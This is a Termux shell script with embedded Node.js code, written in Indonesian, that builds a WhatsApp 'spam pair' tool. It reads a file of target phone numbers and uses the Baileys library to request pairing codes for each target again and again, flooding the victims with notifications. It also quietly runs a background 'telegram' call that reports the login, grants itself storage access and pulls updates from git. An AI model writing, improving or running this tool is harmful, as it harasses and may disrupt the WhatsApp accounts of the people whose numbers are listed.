e="echo -e "
m="\033[1;31m"     # Merah (Sudah diberikan)
h="\033[1;32m"     # Hijau (Sudah diberikan)
k="\033[1;33m"     # Kuning (Sudah diberikan)
b="\033[1;34m"     # Biru (Sudah diberikan)
bl="\033[1;36m"    # Biru Muda (Sudah diberikan)
p="\033[1;37m"     # Putih (Sudah diberikan)
u="\033[1;35m"     # Ungu
pu="\033[1;30m"    # Abu-abu
c="\033[1;96m"     # Cyan Terang
or="\033[1;91m"    # Merah Muda Terang
g="\033[1;92m"     # Hijau Terang
y="\033[1;93m"     # Kuning Terang
bld="\033[1;94m"   # Biru Terang
pwl="\033[1;95m"   # Ungu Terang
blg="\033[1;97m"   # Putih Terang
lg="\033[1;90m"    # Abu-abu Terang
bg_m="\033[41m"    # Latar Belakang Merah
bg_h="\033[42m"    # Latar Belakang Hijau
bg_k="\033[43m"    # Latar Belakang Kuning
bg_b="\033[44m"    # Latar Belakang Biru
bg_bl="\033[46m"   # Latar Belakang Biru Muda
bg_p="\033[47m"    # Latar Belakang Putih
bg_u="\033[45m"    # Latar Belakang Ungu
bg_pu="\033[40m"   # Latar Belakang Abu-abu
bg_c="\033[106m"   # Latar Belakang Cyan Terang
bg_or="\033[101m"  # Latar Belakang Merah Muda Terang
bg_g="\033[102m"   # Latar Belakang Hijau Terang
bg_y="\033[103m"   # Latar Belakang Kuning Terang
bg_bld="\033[104m" # Latar Belakang Biru Terang
bg_pwl="\033[105m" # Latar Belakang Ungu Terang
bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
packagenya() {
               cat << EOF > package.json
{
"main": "galirus.js",
"scripts": {
"start": "node galirus.js"
},
"author": "Galirus & Gusti",
"license": "MIT",
"dependencies": {
"@whiskeysockets/baileys": "^6.5.0",
"chalk": "^4.1.2",
"pino": "^7.0.5",
"readline": "^1.3.0",
"express": "^4.18.2",
"fs": "^0.0.1-security"
}
}
EOF
          }
while true; do
     spamtautan="/data/data/com.termux/files/usr/lib/bash/spam/"
     if [ -d "$spamtautan" ]; then
          clear
          cd /data/data/com.termux/files/usr/lib/bash/spam || exit
          git pull origin main &> /dev/null
          isipesan="Terdeteksi login s1 ( spam pair )  💻"
          telegram &> /dev/null &
          while true; do
               file="node_modules"
               if [ -d "$file" ]; then
                    clear
                    echo "y" | termux-setup-storage &> /dev/null &
                    while true; do
                         scan="$HOME/number.txt"
                         if [ -f "$scan" ]; then
                              break
                         else
                              touch $HOME/number.txt
                         fi
                    done
                    spamnya() {
                         file="$HOME/number.txt"
                         loading() {
                              (
                                   for i in {1..100}; do
                                        echo $i    # Output ke dialog untuk update progress
                                        sleep 0.05 # Delay untuk efek loading
                                   done
                              ) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
                         }
                         loading1() {
                              (
                                   for i in {1..100}; do
                                        echo $i # Output ke dialog untuk update progress
                                   done
                              ) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
                         }
                         show_file() {
                              if [ -f "$file" ]; then
                                   content=$(cat "$file")
                                   echo "$content"
                              else
                                   echo "File $file tidak ditemukan."
                              fi
                         }
                         add_number() {
                              show_file
                              number=$(dialog --inputbox "Masukkan nomor yang ingin ditambahkan ( 628 ):" 15 40 --stdout)
                              if [[ "$number" =~ ^[0-9]+$ ]]; then
                                   echo "$number" >> "$file"
                                   dialog --msgbox "Nomor $number telah ditambahkan ke dalam file." 8 40
                              else
                                   dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
                              fi
                         }
                         remove_number() {
                              show_file
                              if [ -f "$file" ]; then
                                   number_to_remove=$(dialog --inputbox "Masukkan nomor telepon yang ingin dihapus ( 628 ):" 15 40 --stdout)
                                   if [[ "$number_to_remove" =~ ^[0-9]+$ ]]; then
                                        sed -i "/$number_to_remove/d" "$file"
                                        dialog --msgbox "Nomor telepon $number_to_remove telah dihapus dari file." 8 40
                                   else
                                        dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
                                   fi
                              else
                                   dialog --msgbox "File $file tidak ditemukan." 8 40
                              fi
                         }
                         clear
                         loading
                         cd "$spamtautan"
                         clear
                         node -e "$(
                              cat << 'EOF'
const readline = require('readline');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const numberFilePath = path.join(process.env.HOME, '.number_otp');
let numbers = [];
let currentIndex = 0;

const loadNumbers = () => {
    try {
        const data = fs.readFileSync(numberFilePath, 'utf8');
        numbers = data.split('\n').map(num => num.trim()).filter(num => num !== '');
        if (numbers.length === 0) {
            console.log(chalk.red.bold('Tidak ada nomor yang ditemukan di file .number_otp'));
        } else {
            console.log(chalk.greenBright.bold(`Total nomor yang ditemukan: ${numbers.length}`));
        }
    } catch (err) {
        console.error(chalk.red.bold(`Error membaca file: ${err.message}`));
    }
};

// Validasi nomor menggunakan regex
const isValidPhoneNumber = (phoneNumber) => {
    const regex = /^(60\d{8,11}|62\d{9,12})$/; // Format Malaysia & Indonesia
    return regex.test(phoneNumber);
};

const clearConsole = () => {
    process.stdout.write('\x1B[2J\x1B[0f');
};

const processPhoneNumber = (rawNumber) => {
    let phoneNumber = rawNumber.trim();

    if (phoneNumber.startsWith('+62')) {
        phoneNumber = phoneNumber.slice(3);
    }

    if (phoneNumber.startsWith('0')) {
        phoneNumber = phoneNumber.slice(1);
        phoneNumber = '62' + phoneNumber;
    } else if (!phoneNumber.startsWith('62')) {
        // Jika nomor tidak diawali 0, +62, atau 62, tambahkan 62
        phoneNumber = '62' + phoneNumber;
    }
    // Jika nomor sudah diawali 62, biarkan apa adanya

    return phoneNumber;
};

const startSpamProcess = async () => {
    try {
        let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
        let { version } = await fetchLatestBaileysVersion();
        let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
        
        while (true) {
            if (numbers.length === 0) {
                console.log(chalk.red.bold('Tidak ada nomor yang tersedia. Memeriksa ulang dalam 5 detik...'));
                await sleep(5000);
                loadNumbers();
                continue;
            }

            let target = numbers[currentIndex];
            target = processPhoneNumber(target);
            
            console.log(chalk.blueBright(`Nomor yang diproses: ${target}`)); // Tambahan log

            if (!isValidPhoneNumber(target)) {
                console.log(chalk.red.bold(`Nomor tidak valid: ${target}. Melanjutkan ke nomor berikutnya...`));
                currentIndex = (currentIndex + 1) % numbers.length;
                await sleep(1000);
                continue;
            }

            console.log(chalk.greenBright.bold(`[ Pengiriman No: ${target} ]`));
            await startSpamming(sucked, target);

            currentIndex = (currentIndex + 1) % numbers.length;
            console.log(chalk.greenBright.bold('Menunggu 5 detik sebelum mengirim ke nomor berikutnya...'));
            await sleep(5000);
            clearConsole();
        }
    } catch (error) {
        handleError(error);
    }
};

const getRandomColor = () => {
    const letters = '0123456789ABCDEF';
    let color = '#';
    for (let i = 0; i < 6; i++) {
        color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
};

const startSpamming = async (sucked, target) => {
    for (let i = 0; i < 15; i++) {
        await sleep(5000);
        clearConsole();
        const prc = await sucked.requestPairingCode(target);
        const randomColor = getRandomColor();
        console.log(chalk.greenBright.bold(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${chalk.bgBlack(chalk.yellow.bold('Pengembang Script Ini'))} ${chalk.white.bold(':')} ${chalk.hex(randomColor).bold('GALIRUS X GUSTI')}
${chalk.bgBlack(chalk.yellow.bold('Nomor Target Terlock'))} ${chalk.white.bold(' :')} ${chalk.hex('#00BFFF').bold(target)}
${chalk.bgBlack(chalk.yellow.bold('Spam Kode Succesfull'))} ${chalk.white.bold(' :')} ${chalk.red.bold(prc)}
${chalk.bgBlack(chalk.yellow.bold('Total Spam Terkirim'))} ${chalk.white.bold('  :')} ${chalk.bold.white(i + 1)}
        `));
    }
};

const handleError = async (error) => {
    console.error(chalk.red.bold(`Terjadi kesalahan: ${error}`));
    console.log(chalk.yellow.bold(`\n\nSedang Istirahat selama 30 detik sebelum memulai ulang...`));
    console.log(chalk.yellow.bold(`===================================\n`));
    for (let i = 30; i >= 0; i--) {
        process.stdout.write(`\r${chalk.cyan.bold(`Memulai ulang dalam: ${i} detik... `)}`);
        await sleep(1000);
    }
    console.log('\n'); // Pindah baris setelah countdown selesai
    restartSpam();
};

const restartSpam = async () => {
    console.log(chalk.greenBright.bold('Memulai ulang proses spam...'));
    await sleep(1000);
    startSpamProcess();
};

// Mulai program
loadNumbers();
startSpamProcess();

EOF
                         )"
                         read -p "Silahkan Enter"
                    }
                    spamnya
                    break 5
               else
                    clear
                    play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null
                    cd $spamtautan
                    echo "Node_Modules Belum Terinstall"
                    sleep 5
                    clear
                    echo -e "Menginstall Node_Modules"
                    pkg install -y yarn
                    yarn cache clean
                    yarn
                    yarn add @whiskeysockets/baileys
               fi
          done
     else
          clear
          $e $m "Installasi Package$res"
          mkdir "$spamtautan"
          cd "$spamtautan"
          packagenya
     fi
done
